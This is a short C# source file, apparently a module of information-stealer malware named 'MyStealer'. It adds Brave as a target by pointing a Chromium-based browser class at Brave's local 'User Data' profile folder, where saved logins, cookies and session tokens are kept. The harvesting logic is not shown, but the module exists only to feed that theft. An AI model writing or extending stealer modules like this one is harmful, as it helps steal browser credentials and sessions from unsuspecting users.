using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class Brave : Chromium
    {
        public override string ApplicationName => "Brave";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data");
    }
}
